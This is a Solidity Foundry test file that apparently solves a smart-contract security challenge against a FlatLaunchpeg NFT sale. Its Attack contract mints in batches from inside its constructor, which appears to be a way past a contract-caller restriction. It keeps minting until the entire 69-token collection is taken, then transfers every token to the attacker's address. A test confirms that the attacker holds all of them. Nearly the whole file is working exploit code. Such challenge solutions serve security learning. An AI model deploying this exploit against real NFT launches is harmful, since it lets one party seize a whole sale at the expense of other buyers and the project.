// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/FlatLaunchpeg.sol";
import "../src/BaseLaunchpegNFT.sol";
import "../src/LaunchpegErrors.sol";
import "forge-std/Test.sol";


contract Attack {
    FlatLaunchpeg public flatlaunchpegContract;
    address public owner; 

    
    constructor(address flatContractAddress, address attackerAddress) {
        owner = attackerAddress;
        flatlaunchpegContract = FlatLaunchpeg(flatContractAddress); // Creating an instance at this address
        uint i = 0;
        uint quantity = flatlaunchpegContract.maxBatchSize(); 
        uint collectionNum = flatlaunchpegContract.collectionSize();
       
        while(flatlaunchpegContract.totalSupply() < collectionNum) {
            // checking for batch size 
            if(quantity + flatlaunchpegContract.totalSupply() >= collectionNum){
                quantity--; 
            }
            flatlaunchpegContract.publicSaleMint(quantity); // minting the NFTs
            // Sending to attacker
            for (uint n = i; n < quantity + i; n++) {
                flatlaunchpegContract.transferFrom(address(this), owner, n);
            }
            i = i + quantity; // incrementing the token id
        }
    }
}

contract JpegSniperTest is Test {
    address public attacker = address(1);

    FlatLaunchpeg public flatlaunchpeg;
    function setUp() public {
        flatlaunchpeg = new FlatLaunchpeg(69, 10, 10); // to deploy the marketplace with parameters for the contracts constructor
    }

    function testExploit() public {
        // attacker deploying the Attack contract
        vm.startPrank(attacker);
        Attack attack = new Attack(address(flatlaunchpeg), attacker);
        vm.stopPrank();

        // verifying whether the attacker minted max tokens
        assertEq(flatlaunchpeg.balanceOf(attacker), 69);
        assertEq(flatlaunchpeg.totalSupply(), 69);
    }
}